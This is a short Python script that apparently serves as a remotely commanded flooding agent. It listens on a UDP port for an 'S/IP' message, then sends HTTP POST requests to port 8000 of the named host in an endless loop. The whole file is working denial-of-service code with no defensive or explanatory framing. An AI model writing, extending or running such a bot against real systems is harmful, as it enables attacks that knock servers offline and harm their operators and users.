from socket import *
import requests

def Post(url,attackedServerPort):
    parameters = {'dumb': 'dumb'}
    r = requests.post(url,data = parameters)
    print (r.text)

def Is_attack(msg):
    if (msg == 'S'):
        return True
    elif (msg == 'B'):
        return False

attackedServerPort = 8000
serverPort = 12000
serverSocket = socket(AF_INET,SOCK_DGRAM)
hostName = gethostbyname('0.0.0.0')
serverSocket.bind((hostName,serverPort))
sentence, addr = serverSocket.recvfrom(1024)

print sentence

command = sentence.split('/')[0]
IP = sentence.split('/')[1]


IP = 'http://' + IP + ':' + str(attackedServerPort)

print IP
if Is_attack(command):

    while 1:
        Post(IP,attackedServerPort)

serverSocket.close()



